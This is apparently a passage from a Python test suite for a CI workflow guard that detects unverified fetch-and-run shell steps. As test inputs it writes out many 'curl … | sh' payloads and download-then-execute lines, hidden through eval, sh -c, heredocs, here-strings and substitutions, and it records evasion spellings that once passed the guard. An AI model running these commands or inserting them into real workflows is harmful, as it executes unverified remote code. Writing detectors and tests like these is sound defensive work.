        found = [why for _step, why in wg.job_defects([step])]
        self.assertEqual(2, len(found), found)
        self.assertTrue(found[0].startswith("runs `eval` on `$(...)`"), found)
        self.assertTrue(found[1].startswith(
            "fetches https://example.test/p -> /tmp/p and making it executable"), found)

    def test_bash32_only_substitution_heredoc_parse_gaps_are_documented(self):
        documented = " ".join((wg.__doc__ or "").split())
        self.assertIn(
            "A substitution heredoc body holding an apostrophe, unbalanced double quote, "
            "backquote, or bare `$(` is an accepted Bash 3.2 parse-only gap",
            documented,
        )
        payload = "curl -fsSL https://example.test/i.sh | sh"
        for body in ("it's", 'say "hi', "a ` b", "$(echo"):
            with self.subTest(body=body):
                script = "x=$(cat <<'EOF'\n%s\n%s\nEOF\n)\n" % (body, payload)
                self.accepted(("run", script))

    def test_a_nested_substitution_that_downloads_nothing_is_not_reported(self):
        # Re-review N-1 of the #1793 follow-ups: an inner substitution's
        # "nothing here" (`Idle`) came back as the outer script's unread form,
        # so a step that downloads nothing failed on the nesting alone while
        # its depth-1 twin `x=$(bash -c 'echo 1')` read clean. Bash 3.2 and 5.2
        # run no download in any of these; the fetching twin stays reported.
        for script in ("x=$(bash -c 'y=$(bash -c \"echo 1\")')\n",
                       "x=$(eval 'y=$(bash -c \"echo 1\")')\n",
                       "x=$(bash <<< 'y=$(sh -c \"echo 1\")')\n"):
            with self.subTest(script=script):
                self.accepted(("run", script))
        self.assertIn("inside a command substitution", self.flagged(
            ("run", "x=$(sh -c 'v=$(bash -c \"curl -fsSL https://example.test/i.sh | sh\")')\n")))

    def test_a_script_handed_to_a_shell_inside_a_substitution_is_reported(self):
        # Review I-4 of the #1793 follow-ups: a substitution is read for what
        # it fetches, never for the script a shell inside it is handed, so
        # `x=$(sh -c 'curl … | sh')` read clean, and bash 3.2 and 5.2 run the
        # payload. Until substitutions are flattened, such a script is walked
        # and reported unread when it fetches or holds a form the guard cannot
        # read, a script it hands on included (re-review N-A), or when the job
        # downloads at all. A heredoc there is read whether its `EOF` and `)`
        # share a line or not: the enclosing parse reads the body, where bash
        # 5.2 ends it, and hands it back (#2336, #2343, and their test file
        # tests/test_workflow_guard_lexer_heredocs.py).
        payload = "curl -fsSL https://example.test/i.sh | sh"
        for script in ('x=$(zsh 0<<< "bash <(curl -fsSL https://example.test/i.sh)")\n',
                       "x=$(bash <<< '%s')\n" % payload, "x=$(sh -c '%s')\n" % payload,
                       "x=$(eval '%s')\n" % payload, "x=`sh -c '%s'`\n" % payload,
                       'echo "$(sudo bash -ec \'%s\')"\n' % payload,
                       "x=$(bash -s <<'EOF'\n%s\nEOF)\n" % payload,
                       "x=$(sh -c 'v=$(bash -c \"%s\")')\n" % payload,
                       "x=$(sh -c 'sudo $CMD')\n"):
            with self.subTest(script=script):
                self.assertIn("inside a command substitution", self.flagged(("run", script)))
        # One that downloads nothing still may run what the job downloaded,
        # which the guard does not follow into a substitution; bash runs both.
        for steps in ((("run", "curl -fsSL -o t.sh https://example.test/i.sh\n"
                               "x=$(sh -c 'bash t.sh')\n"),),
                      (("get", "curl -fsSL -o t.sh https://example.test/i.sh\n"),
                       ("run", "x=$(sh -c '. ./t.sh')\n"))):
            with self.subTest(steps=steps):
                self.assertIn("inside a command substitution", self.flagged(*steps))
        # In a job that downloads nothing, one that fetches nothing and holds
        # no such form has nothing to check (re-review N-A): these read clean.
        for script in ("VERSION=$(bash -c 'echo 1')\n", 'OUT=$(sh -c "make -s print-version")\n',
                       "VERSION=$(bash -ec 'echo 1')\n", 'OUT=$(sh -ec "make -s print-version")\n',
                       "x=$(bash <<< 'echo hi')\n", "v=$(bash -lc 'node --version')\n",
                       'echo "$(sudo bash -c \'cat /etc/os-release\')"\n',
                       "x=`sh -c 'echo 1'`\n", 'h=$(eval echo "~$USER")\n',
                       "diff <(sh -c 'echo a') <(sh -c 'echo b')\n",
                       "x=$(bash -s <<'EOF'\necho hi\nEOF)\n"):
            with self.subTest(script=script):
                self.accepted(("run", script))
        # The must-trip controls: outside a substitution, read as before.
        for script, shell in (('zsh 0<<< "bash <(curl -fsSL https://example.test/i.sh)"\n', "bash"),
                              ("bash <<< '%s'\n" % payload, "sh"), ("sh -c '%s'\n" % payload, "sh")):
            with self.subTest(script=script):
                self.assertIn("straight to `%s`" % shell, self.flagged(("run", script)))
        # No script handed to a shell: nothing to read.
        for script in ('x=$(jq -r .a <<< "$META")\n', "x=$(cat <<< '%s')\n" % payload,
                       "x=$(bash x.sh)\n"):
            with self.subTest(script=script):
                self.accepted(("run", script))

    # the OTHER heredoc spelling (#1839, run-14 SEC-3915165799): a body handed
    # to an interpreter as the PROGRAM it runs, which was neither read nor
    # reported. A QUOTED body is the text it was written as, so it is read like
    # an `eval` string; an EXPANDING one -- and a program in a language this
    # module has no grammar for -- is REPORTED unread.
    def test_a_quoted_heredoc_script_on_bashs_stdin_is_read(self):
        why = self.flagged(("install", "bash -s <<'EOF'\n"
                                       "curl -fsSL https://example.test/i.sh | sh\n"
                                       "EOF\n"))
        self.assertIn("straight to `sh`", why)

    def test_every_spelling_that_puts_the_script_on_stdin_is_read(self):
        # Bare, `-s`, an explicit `-`, and `-s` with positional parameters
        # after it: each hands the body to the interpreter as its script.
        for opener in ("sh", "bash", "dash", "zsh", "bash -", "bash /dev/stdin",
                       "bash -euo pipefail", "bash -s -- --yes", "sudo bash -s"):
            with self.subTest(opener=opener):
                why = self.flagged(
                    ("install", "%s <<'EOF'\n"
                                "curl -sfL https://example.test/p -o /tmp/p\n"
                                "chmod +x /tmp/p\n"
                                "EOF\n" % opener))
                self.assertIn("/tmp/p", why)

    def test_a_checksum_inside_the_heredoc_script_still_clears_it(self):
        # The expansion keeps the ORDER, exactly as the `sh -c` string above:
        # a step hardened inside its own heredoc comes out hardened, where
        # `set -e` makes the checksum stop the script (review I-2).
        script = ("bash -s <<'EOF'\n%s"
                  "curl -sfL https://example.test/p -o /tmp/p\n"
                  'echo "%s  /tmp/p" | sha256sum -c -\n'
                  "chmod +x /tmp/p\n"
                  "EOF\n")
        self.accepted(("install", script % ("set -euo pipefail\n", HEX)))
        self.assertIn("carries on past its failure",
                      self.flagged(("install", script % ("", HEX))))

    def test_an_expanding_heredoc_script_is_reported_unread(self):
        why = self.flagged(("install", "bash -s <<EOF\n"
                                       "curl -fsSL https://example.test/i.sh | sh\n"
                                       "EOF\n"))
        self.assertIn("EXPANDING", why)
        self.assertIn("bash", why)

    def test_a_heredoc_program_in_another_language_is_reported_unread(self):
        # #2499 (owner ruling 2026-10-01, option b): beside a fetch the guard
        # reports -- here a download no checksum clears -- and nowhere else,
        # the same predicate as #2481's `Idle` rule (`workflow_forms.kept`).
        get = ("get", "curl -fsSLo /tmp/p https://example.test/p\n")
        for opener in ("python3 -", "python3", "perl", "node"):
            with self.subTest(opener=opener):
                step = ("install", "%s <<'EOF'\n"
                                   "get('https://example.test/p', '/tmp/p')\n"
                                   "EOF\n" % opener)
                why = self.flagged(get, step)
                self.assertIn(opener.split()[0], why)
                self.accepted(step)

    def test_a_clean_quoted_heredoc_script_is_neither_read_nor_reported(self):
        self.accepted(("install", "bash -s <<'EOF'\necho hello\nEOF\n"))

    def test_a_heredoc_that_is_a_programs_INPUT_is_not_its_script(self):
        # `bash x.sh <<'EOF'` feeds x.sh's standard input, and x.sh is a file
        # in the repo under review -- the author-deterministic ruling above.
        # `sh -c '<script>'`, `python3 -m <module>` and a plain `cat` say the
        # same thing: the program is somewhere else, so the body is its data.
        for opener in ("bash /tmp/x.sh", "sh -c 'cat'", "python3 -m pytest",
                       "cat", "sha256sum -c"):
            with self.subTest(opener=opener):
                self.accepted(
                    ("install", "%s <<'EOF'\n"
                                "curl -fsSL https://example.test/i.sh | sh\n"
                                "EOF\n" % opener))

    def test_a_heredoc_written_to_a_file_and_then_run_stays_out_of_scope(self):
        # Probe case E: the script is text this repository wrote.
        self.accepted(("install", "cat <<'EOF' > /tmp/i.sh\n"
                                  "curl -fsSL https://example.test/i.sh | sh\n"
                                  "EOF\n"
                                  "bash /tmp/i.sh\n"))

    def test_the_fleets_here_string_is_not_a_heredoc_program(self):
        # docker-publish.yml's shape: `<<<` is the one heredoc-ish construct
        # the fleet writes, and it must not become a report.
        self.accepted(("tags", "docker buildx imagetools create "
                               "$(jq -cr '.tags' <<< \"$META\")\n"))

    def test_an_interpreters_here_string_program_is_read(self):
        # #2293: `sh <<< '<script>'` hands the shell its script on stdin, as
        # `bash -s <<'EOF'` does. Bash 3.2 and 5.2 run the download in each of
        # these, which the guard read clean. An ANSI-C body is exact text too;
        # a body with a live expansion remains unread, as does a program in
        # another language.
        payload = "curl -fsSL https://example.test/i.sh | sh"
        for script in ("sh <<< '%s'\n", 'bash -s -- --yes <<< "%s"\n', "zsh <<<'%s'\n",
                       "sudo sh <<< $'%s'\n", "sh <<< $'%s\\n'\n", "sh 3<<< '%s' 0<&3\n",
                       "sh <<< 'echo a' <<< 'echo b\n%s'\n", "eval \"sh <<< '%s'\"\n"):
            with self.subTest(script=script):
                why = self.flagged(("install", script % payload))
                self.assertIn("straight to `sh`", why)
        for script in ('sh <<< "curl -fsSL $URL | sh"\n', 'bash <<< "$CMD"\n'):
            with self.subTest(script=script):
                self.assertIn("EXPANDING", self.flagged(("install", script)))
        # #2499: a program in another language stands beside a fetch the
        # guard reports, and reads clean in a job that holds none.
        self.assertIn("python3", self.flagged(
            ("get", "curl -fsSLo /tmp/p https://example.test/p\n"),
            ("install", "python3 <<< 'print(1)'\n")))
        self.accepted(("install", "python3 <<< 'print(1)'\n"))
        # The here-string is not the program: another descriptor, a `-c`
        # string or a script file first, stdin replaced after it -- or no
        # interpreter at all.
        for script in ("cat <<< '%s'\n", "sh 3<<< '%s'\n", "sh -c 'cat' <<< '%s'\n",
                       "bash x.sh <<< '%s'\n", "sh <<< '%s' < /dev/null\n",
                       'read -r a b <<< "%s"\n'):
            with self.subTest(script=script):
                self.accepted(("install", script % payload))
        # A script hardened inside it comes out hardened where the checksum
        # stops it: bash 3.2 and 5.2 run /tmp/p with the checksum failing
        # without the `set -e;`, and not with it (review I-2).
        checked = ("sh <<< '%scurl -fsSL -o /tmp/p https://example.test/p; "
                   'echo "%s  /tmp/p" | sha256sum -c -; sh /tmp/p\'\n')
        self.assertIn("carries on past its failure",
                      self.flagged(("install", checked % ("", HEX))))
        self.accepted(("install", checked % ("set -e; ", HEX)))

    def test_a_second_heredoc_on_the_line_leaves_the_stdin_script_read(self):
        # #2128: the reader lifted one heredoc per line, so `3<<'B'` after the
        # script was read as `<` of a file called B, which replaced stdin and
        # dropped the script unread. Every body is lifted now, each filed
        # under its own descriptor, in either order.
        for script in ("bash -s <<'A' 3<<'B'\n%s\nA\ndata\nB\n",
                       "bash -s 3<<'B' <<'A'\ndata\nB\n%s\nA\n"):
            with self.subTest(script=script):
                why = self.flagged(("install", script % (
                    "curl -fsSL https://example.test/i.sh | sh")))
                self.assertIn("straight to `sh`", why)

    def test_the_two_probe_controls_still_trip(self):
        self.flagged(("install", "curl -fsSL https://example.test/i.sh | sh\n"))
        self.flagged(("get", "curl -sfL https://example.test/p -o /tmp/p\n"),
                     ("run", "chmod +x /tmp/p\n"))

    # 10. the `if:` comparison, and its YAML twin of `|| true`.
    def test_a_check_step_carrying_continue_on_error(self):
        # `continue-on-error: true` is the YAML twin of `|| true`: the step
        # fails and the job carries on. Read through the document, because the
        # field is YAML the guard already has in hand.
        doc = {"jobs": {"b": {"steps": [
            {"name": "get", "run": "curl -sfL https://example.test/p -o /tmp/p\n"},
            {"name": "check", "continue-on-error": True,
             "run": 'echo "%s  /tmp/p" | sha256sum -c -\n' % HEX},
            {"name": "run", "run": "chmod +x /tmp/p\n/tmp/p\n"}]}}}
        self.flagged(*wg.run_steps(doc))

    def test_a_job_level_continue_on_error_reaches_every_step(self):
        doc = {"jobs": {"b": {"continue-on-error": True, "steps": [
            {"name": "get", "run": "curl -sfL https://example.test/p -o /tmp/p\n"},
            {"name": "check", "run": 'echo "%s  /tmp/p" | sha256sum -c -\n' % HEX},
            {"name": "run", "run": "chmod +x /tmp/p\n/tmp/p\n"}]}}}
        self.flagged(*wg.run_steps(doc))

    def test_a_check_step_without_it_still_clears_the_fetch(self):
        doc = {"jobs": {"b": {"steps": [
            {"name": "get", "run": "curl -sfL https://example.test/p -o /tmp/p\n"},
            {"name": "check", "continue-on-error": False,
             "run": 'echo "%s  /tmp/p" | sha256sum -c -\n' % HEX},
            {"name": "run", "run": "chmod +x /tmp/p\n/tmp/p\n"}]}}}
        self.accepted(*wg.run_steps(doc))

    def test_a_soft_step_still_counts_as_fetching(self):
        doc = {"jobs": {"b": {"steps": [
            {"name": "get", "continue-on-error": True,
             "run": "curl -sfL https://example.test/p -o /tmp/p\n"},
            {"name": "run", "run": "chmod +x /tmp/p\n/tmp/p\n"}]}}}
        self.flagged(*wg.run_steps(doc))

    def test_a_condition_compared_as_written_is_assumed_stable(self):
        # `env.NEED` is rewritten between the two steps, so the SAME text is
        # not the same answer -- but the guard compares the text.
        when = "env.NEED == 'yes'"
        self.accepted(
            wg.Step("get", "curl -sfL https://example.test/p -o /tmp/p\n"),
            wg.Step("check", 'echo "%s  /tmp/p" | sha256sum -c -\n' % HEX, None, when),
            wg.Step("flip", 'echo "NEED=no" >> "$GITHUB_ENV"\n'),
            wg.Step("run", "chmod +x /tmp/p\n/tmp/p\n", None, when))

    # 11. a directory on the runner's PATH past `PATH_DIRS`, or one a step
    # puts there itself (#2308 closed the fixed ones:
    # `TestADownloadWrittenIntoADirectoryOnPath`; review N-4 named the rest).
    def test_a_directory_a_step_puts_on_path(self):
        fetch = ("get", "curl -sfL https://example.test/p -o bin/payload\n")
        self.accepted(fetch, ("path", 'echo "$PWD/bin" >> "$GITHUB_PATH"\n'),
                      ("run", "payload --version\n"))
        self.accepted(fetch, ("run", 'export PATH="$PWD/bin:$PATH"\npayload --version\n'))
        self.flagged(("get", "curl -sfL https://example.test/p -o /usr/local/bin/payload\n"),
                     ("run", "payload --version\n"))
        # ... and the runner image's own directories past `PATH_DIRS` (review
        # N-4), which bash 3.2 and 5.2 find a bare name in when on PATH.
        self.accepted(("get", "curl -sfL https://example.test/p -o /snap/bin/payload\n"),
                      ("run", "payload --version\n"))
        # Half of that entry is now reached from the other side: #2442 binds a
        # download written to a `$`-spelled path by its literal basename, so
        # the `$HOME` spelling -- the one a step actually writes -- is reported,
        # whatever `PATH_DIRS` holds. What is left of the gap is the paths
        # spelled with no `$` in them, and whatever a step puts on PATH.
        self.flagged(("get", 'curl -sfL https://example.test/p -o "$HOME/.cargo/bin/payload"\n'),
                     ("run", "payload --version\n"))

    # 12. a download the PIPELINE writes under a name `_WRITERS` misses
    # (review r0 finding 2's residual).
    def test_a_pipeline_writer_outside_the_table_is_not_weighed(self):
        # The `> f` redirect, `dd`, `sponge` and `tee` are weighed
        # (`workflow_forms.unbound`); a writer the table does not name is
        # not -- `parse_fetch` binds no destination to any of them, so no
        # checksum in the job can reach the file either way.
        fetch = "curl -fsSL https://example.test/tool | %s\n"
        unread = ("run", "$PYTHON -c 'import sys'\n")
        self.accepted(("get", fetch % "busybox dd of=f"), unread)
        self.flagged(("get", fetch % "dd of=f"), unread)


class TestRunSteps(unittest.TestCase):
    """The reader the repo-wide rule and the CLI share."""

    DOC = {"jobs": {"build": {"steps": [
        {"name": "checkout", "uses": "actions/checkout@" + "0" * 40},
        {"name": "install", "run": "curl -fsSL https://example.test/i.sh | sh\n"},
        {"run": "make test\n"},
    ]}}}

    def test_every_run_step_is_yielded_with_its_name(self):
        self.assertEqual(
            [wg.Step("install", "curl -fsSL https://example.test/i.sh | sh\n", None),
             wg.Step("<unnamed step>", "make test\n", None)],
            list(wg.run_steps(self.DOC)))

    def test_a_document_with_no_jobs_yields_nothing(self):
        self.assertEqual([], list(wg.run_steps({})))


class TestCli(unittest.TestCase):
    """`python3 scripts/workflow_guard.py .github/workflows/*.yml` -- the same
    rule the suite runs, for a human holding a shell."""

    WORKFLOW = ("name: t\non: [push]\njobs:\n  b:\n    runs-on: ubuntu-latest\n"
                "    steps:\n      - name: install\n"
                "        run: curl -fsSL https://example.test/i.sh | sh\n")

    def test_it_reports_and_fails_on_an_unverified_fetch(self):
        with tempfile.TemporaryDirectory() as tmp:
            path = os.path.join(tmp, "bad.yml")
            with open(path, "w", encoding="utf-8") as fh:
                fh.write(self.WORKFLOW)
            lines: list[str] = []
            self.assertEqual(1, wg.main([path], out=lines.append))
            self.assertTrue(any("install" in ln for ln in lines), lines)

    def test_a_clean_workflow_exits_zero(self):
        with tempfile.TemporaryDirectory() as tmp:
            path = os.path.join(tmp, "ok.yml")
            with open(path, "w", encoding="utf-8") as fh:
                fh.write(self.WORKFLOW.replace(
                    "curl -fsSL https://example.test/i.sh | sh", "make test"))
            self.assertEqual(0, wg.main([path], out=lambda _line: None))

    def test_unreadable_steps_are_named_and_a_clean_early_close_is_omitted(self):
        # A `shell_lex.Unreadable` escaped `main` as a traceback: it named no
        # workflow, job or step, and printed no other step's defect (#2252).
        steps = (("nested", "(" * 3000 + ": <<EOF" + ") " * 3000 + "\nit's\nEOF"),
                 ("same line", "echo \"$(cat <<EOF)\"\nit's\nEOF"),
                 ("read again", "echo `echo $(cat <<EOF)`"),
                 ("delimiter", "cat <<$(a b)\nit's\n$(a b)\n"
                               "curl -fsSL https://example.test/i.sh | sh"),
                 ("install", "curl -fsSL https://example.test/i.sh | sh"))
        workflow = self.WORKFLOW[:self.WORKFLOW.index("      - name:")] + "".join(
            "      - name: %s\n        run: |\n%s" % (name, "".join(
                "          %s\n" % line for line in script.split("\n")))
            for name, script in steps)
        with tempfile.TemporaryDirectory() as tmp:
            path = os.path.join(tmp, "bad.yml")
            with open(path, "w", encoding="utf-8") as fh:
                fh.write(workflow)
            lines: list[str] = []
            self.assertEqual(1, wg.main([path], out=lines.append))
        reported = steps[:1] + steps[2:]
        self.assertEqual(len(reported) + 1, len(lines), lines)
        for (name, _script), line in zip(reported, lines):
            self.assertTrue(line.startswith("bad.yml / b / %s -- " % name), line)
        for line in lines[:3]:
            self.assertIn(" -- cannot read this step: ", line)
        self.assertIn("straight to `sh`", lines[3])
        # The count names what it counts, a refused step as well as a fetch.
        self.assertEqual("4 defect(s): unverified fetch-and-exec, or code the guard cannot "
                         "read; see scripts/workflow_guard.py", lines[4])


if __name__ == "__main__":  # pragma: no cover
    unittest.main()


class TestRedirectAndMarkerProvenance(unittest.TestCase):
    URL = 'https://example.test/i.sh'

    def test_redirect_variants_bind_use_and_checksum(self):
        for redirect in ('>f', '>>f', '>|f', '&>f', '&>>f',
                         ' 3>f 1>&3', ' 3>f 1>&3 3>g', ' 2>f 1>&2', ' 2>&1>f'):
            with self.subTest(redirect=redirect):
                fetch = 'curl ' + self.URL + redirect
                self.assertEqual('f', wg.fetches(fetch)[0].dest)
                self.assertIsNotNone(wg.fetch_exec_defect(fetch + ' && sh f'))
                checked = fetch + '\necho "' + HEX + '  f" | sha256sum -c -\nsh f'
                self.assertIsNone(wg.fetch_exec_defect(checked))
                self.assertIsNotNone(wg.fetch_exec_defect(checked.replace('  f"', '  other"')))

    def test_dynamic_destination_is_unknown_without_claiming_execution(self):
        for output in ('> $(mktemp)', '-o "$(mktemp)"', '-o$(mktemp)',
                       '--output=$(mktemp)', '--output-dir=$(mktemp) -o f',
                       ' 3>$(mktemp) 1>&3'):
            with self.subTest(output=output):
                defect = wg.fetch_exec_defect('curl ' + self.URL + ' ' + output)
                self.assertIsNotNone(defect)
                self.assertIn('unknown destination', defect)
                self.assertNotIn('running', defect)
                self.assertNotIn('@@', defect)
        self.assertIsNone(wg.fetch_exec_defect('curl ' + self.URL))
        self.assertIsNotNone(wg.fetch_exec_defect(
            'f=$(mktemp); curl ' + self.URL + ' > "$f"; sh "$f"'))

    def test_literals_in_nested_scripts_are_not_filtered(self):
        for wrapper in ('eval', 'sh -c'):
            for marker in ('@@subst0@@', '@@heredoc0@@', '@@casearm@@',
                           '@@group-open@@', '@@group-close@@'):
                script = wrapper + ' "echo ' + marker + '; curl ' + self.URL + ' | sh"'
                self.assertIsNotNone(wg.fetch_exec_defect(script), script)

    def test_literal_substitution_is_not_credited_twice(self):
        script = 'eval "@@subst0@@" "$(curl ' + self.URL + ')"'
        self.assertEqual(1, len(wg.fetches(script)))
        self.assertIsNotNone(wg.fetch_exec_defect(script))

    def test_literal_case_marker_does_not_promote_command(self):
        self.assertEqual([], wg.fetches('@@casearm@@curl ' + self.URL + ' | sh'))
        self.assertIsNotNone(wg.fetch_exec_defect(
            'case x in a|b) echo @@casearm@@; curl ' + self.URL + ' | sh;; esac'))

    def test_literal_destination_stays_literal_beside_real_substitution(self):
        for marker in ('@@subst0@@', '@@heredoc0@@', '@@casearm@@',
                       '@@group-open@@', '@@group-close@@'):
            # A second URL/operand after curl is an unread multiple-transfer
            # case; the header operand tests substitution handling separately.
            fetch = 'curl ' + self.URL + ' -H "$(echo unused)" > "' + marker + '"'
            self.assertIsNone(wg.fetch_exec_defect(fetch))
            defect = wg.fetch_exec_defect(fetch + '; sh "' + marker + '"')
            self.assertIsNotNone(defect)
            self.assertIn(marker, defect)
            self.assertNotIn('unknown destination', defect)


class TestDestinationProvenanceControls(unittest.TestCase):
    def test_only_the_final_stdout_sink_is_dynamic(self):
        script = 'curl https://example.test/i.sh >$(mktemp) >f; sh f'
        defect = wg.fetch_exec_defect(script)
        self.assertIsNotNone(defect)
        self.assertNotIn('unknown destination', defect)
        self.assertEqual('f', wg.fetches(script)[0].dest)
        self.assertIsNone(wg.fetch_exec_defect(
            'curl https://example.test/i.sh >$(mktemp) 1>&2'))

    def test_a_literal_eval_operand_beside_real_substitution_is_still_read(self):
        script = ('eval "echo @@subst0@@; curl https://example.test/literal | sh" '
                  '"$(curl https://example.test/substitution)"')
        self.assertEqual(2, len(wg.fetches(script)))
        defects = wg.fetch_exec_defects(script)
        self.assertEqual(2, len(defects))
        self.assertTrue(any('/literal' in d for d in defects))
        self.assertTrue(any('/substitution' in d for d in defects))


class TestExplicitDestinationPrecedence(unittest.TestCase):
    def test_named_output_is_not_replaced_by_stdout_redirection(self):
        for tool, output in (('curl', '-o'), ('wget', '-O')):
            with self.subTest(tool=tool):
                fetch = tool + ' https://example.test/i.sh ' + output + ' f >$(mktemp)'
                self.assertEqual('f', wg.fetches(fetch)[0].dest)
                self.assertIsNone(wg.fetch_exec_defect(fetch))
                defect = wg.fetch_exec_defect(fetch + '; sh f')
                self.assertIsNotNone(defect)
                self.assertNotIn('unknown destination', defect)

    def test_dynamic_named_output_is_not_hidden_by_static_stdout_redirection(self):
        for tool, output in (('curl', '-o'), ('wget', '-O')):
            with self.subTest(tool=tool):
                fetch = tool + ' https://example.test/i.sh ' + output + ' $(mktemp) >f'
                self.assertIn('unknown destination', wg.fetch_exec_defect(fetch))

    def test_explicit_stdout_still_follows_redirection(self):
        for tool, output in (('curl', '-o'), ('wget', '-O')):
            for stdout in ('-', '/dev/stdout'):
                with self.subTest(tool=tool, stdout=stdout):
                    fetch = tool + ' https://example.test/i.sh ' + output + ' ' + stdout + '>f'
                    self.assertEqual('f', wg.fetches(fetch)[0].dest)
                    self.assertIsNotNone(wg.fetch_exec_defect(fetch + '; sh f'))
                    self.assertIn('unknown destination',
                                  wg.fetch_exec_defect(fetch.replace('>f', '>$(mktemp)')))


class TestReviewedRedirectBoundaries(unittest.TestCase):
    def test_group_adjacent_redirects_bind_use_and_checksum(self):
        for fetch in ('(1>f curl https://example.test/a)',
                      '(3>f 1>&3 curl https://example.test/a)'):
            with self.subTest(fetch=fetch):
                self.assertEqual('f', wg.fetches(fetch)[0].dest)
                self.assertIsNotNone(wg.fetch_exec_defect(fetch + '; sh f'))
                checked = fetch + '\necho "' + HEX + '  f" | sha256sum -c -\nsh f'
                self.assertIsNone(wg.fetch_exec_defect(checked))
                self.assertIsNotNone(wg.fetch_exec_defect(checked.replace('  f"', '  other"')))

    def test_output_directory_does_not_change_explicit_stdout(self):
        for directory in ('out', '$(mktemp)'):
            for stdout in ('-', '/dev/stdout', '/dev/fd/1'):
                with self.subTest(directory=directory, stdout=stdout):
                    fetch = ('curl https://example.test/a --output-dir '
                             + directory + ' -o ' + stdout)
                    self.assertIsNone(wg.fetches(fetch)[0].dest)
                    self.assertIsNone(wg.fetch_exec_defect(fetch))
                    redirected = fetch + ' >f'
                    self.assertEqual('f', wg.fetches(redirected)[0].dest)
                    self.assertIsNotNone(wg.fetch_exec_defect(redirected + '; sh f'))
                    checked = redirected + '\necho "' + HEX + '  f" | sha256sum -c -\nsh f'
                    self.assertIsNone(wg.fetch_exec_defect(checked))
                    self.assertIn('unknown destination',
                                  wg.fetch_exec_defect(fetch + ' >$(mktemp)'))

    def test_explicit_discard_does_not_follow_stdout_redirects(self):
        for tool, output in (('curl', '-o'), ('wget', '-O')):
            for redirect in (' >$(mktemp)', ' 3>$(mktemp) 1>&3', ' >f'):
                with self.subTest(tool=tool, redirect=redirect):
                    fetch = tool + ' https://example.test/a ' + output + ' /dev/null' + redirect
                    self.assertIsNone(wg.fetches(fetch)[0].dest)
                    self.assertIsNone(wg.fetch_exec_defect(fetch))
                    self.assertIsNone(wg.fetch_exec_defect(fetch + '; sh f'))
                    dynamic = fetch.replace(output + ' /dev/null', output + ' $(mktemp)')
                    self.assertIn('unknown destination', wg.fetch_exec_defect(dynamic))


class TestInferredFilenameOrigin(unittest.TestCase):
    FETCHERS = ('curl -O --output-dir', 'wget -P')

    def test_inferred_dash_filename_binds_directory_use_and_checksum(self):
        for fetcher in self.FETCHERS:
            for redirect in ('', ' >g', ' >$(mktemp)'):
                with self.subTest(fetcher=fetcher, redirect=redirect):
                    fetch = fetcher + ' out https://example.test/-' + redirect
                    self.assertEqual('out/-', wg.fetches(fetch)[0].dest)
                    defect = wg.fetch_exec_defect(fetch + '; sh out/-')
                    self.assertIsNotNone(defect)
                    self.assertNotIn('unknown destination', defect)
                    checked = fetch + '\necho "' + HEX + '  out/-" | sha256sum -c -\nsh out/-'
                    self.assertIsNone(wg.fetch_exec_defect(checked))
                    self.assertIsNotNone(wg.fetch_exec_defect(
                        checked.replace('  out/-"', '  other"')))

    def test_inferred_dash_filename_keeps_dynamic_directory_provenance(self):
        for fetcher in self.FETCHERS:
            for redirect in ('', ' >g'):
                with self.subTest(fetcher=fetcher, redirect=redirect):
                    fetch = fetcher + ' "$(mktemp)" https://example.test/-' + redirect
                    self.assertTrue(shell_reader.has_substitution(wg.fetches(fetch)[0].dest))
                    self.assertIn('unknown destination', wg.fetch_exec_defect(fetch))

    def test_inferred_dash_without_directory_is_still_a_filename(self):
        for fetcher in ('curl -O', 'wget'):
            with self.subTest(fetcher=fetcher):
                fetch = fetcher + ' https://example.test/- >g'
                self.assertEqual('-', wg.fetches(fetch)[0].dest)
                self.assertIsNotNone(wg.fetch_exec_defect(fetch + '; sh ./-'))


class TestIssue1852GuardSpellings(unittest.TestCase):
    FETCH = 'curl -fsSL https://example.test/p -o /tmp/d/p\n'
    USE = 'chmod +x /tmp/d/p\n'

    def test_long_check_flag_on_sha384_and_sha512_binds_the_download(self):
        for tool, digest in (('sha384sum', 'a' * 96),
                             ('sha512sum', 'b' * 128)):
            with self.subTest(tool=tool):
                check = 'echo "%s  /tmp/d/p" | %s --check -\n' % (digest, tool)
                self.assertIsNone(wg.fetch_exec_defect(self.FETCH + check + self.USE))
                other = 'echo "%s  /tmp/d/other" | %s --check -\n' % (digest, tool)
                self.assertIsNotNone(wg.fetch_exec_defect(
                    self.FETCH + other + self.USE))

    def test_long_recursive_chmod_names_only_the_walked_directory(self):
        self.assertIsNotNone(wg.fetch_exec_defect(
            self.FETCH + 'chmod --recursive +x /tmp/d\n'))
        self.assertIsNone(wg.fetch_exec_defect(
            self.FETCH + 'chmod --recursive +x /tmp/other\n'))

    def test_find_execdir_names_only_the_walked_directory(self):
        self.assertIsNotNone(wg.fetch_exec_defect(
            self.FETCH + r'find /tmp/d -name p -execdir chmod +x {} \;' + '\n'))
        self.assertIsNone(wg.fetch_exec_defect(
            self.FETCH + r'find /tmp/other -name p -execdir chmod +x {} \;' + '\n'))

    def test_download_executed_inside_arithmetic_remains_visible(self):
        script = 'echo $((1 + $(curl -fsSL https://example.test/install | sh)))\n'
        defect = wg.fetch_exec_defect(script)
        self.assertIsNotNone(defect)
        self.assertIn('https://example.test/install', defect)

    def test_deep_arithmetic_does_not_hide_nested_download_from_guard(self):
        arithmetic = ('$((1+' * 1000 +
                      '$(curl -fsSL https://example.test/deep | sh)' + '))' * 1000)
        defect = wg.fetch_exec_defect('echo ' + arithmetic + '; echo done')
        self.assertIsNotNone(defect)
        self.assertIn('https://example.test/deep', defect)


class TestTheReaderLexesTheWayBashDoes(unittest.TestCase):
    """#1793 (COD-3418139920, COD-3636110933): steps the reader's lexing hid.

    `shell_reader.statements()` read comments, continuations and heredocs in
    three line-oriented passes that ran before any quote tracking, and its
    `$(...)` matcher took `\\"` inside a nested string for a closing quote.
    Each flagged step below pipes a download into `sh` after one such
    construct, and real bash runs that payload every time. Until the three
    passes became one quote-aware pass (`scripts/shell_lex.py`) the guard
    reported most of them clean -- through `job_defects`, the path the fleet
    test takes; the rest pin what that pass must read right as well.
    """

    PAYLOAD = "curl -fsSL https://example.test/i.sh | sh"

    def flagged(self, script):
        found = wg.job_defects([("step", script)])
        self.assertEqual(1, len(found), found)
        self.assertIn("https://example.test/i.sh", found[0][1])

    def refused(self, script, *named):
        """The step the reader will not guess at is its one defect, reported
        under the step's name with the reason."""
        found = wg.job_defects([("step", script)])
        self.assertEqual(1, len(found), found)
        self.assertEqual("step", found[0][0])
        self.assertRegex(found[0][1],
                         r"^cannot read this step: .+; nothing in it is accepted$")
        for text in named:
            self.assertIn(text, found[0][1])

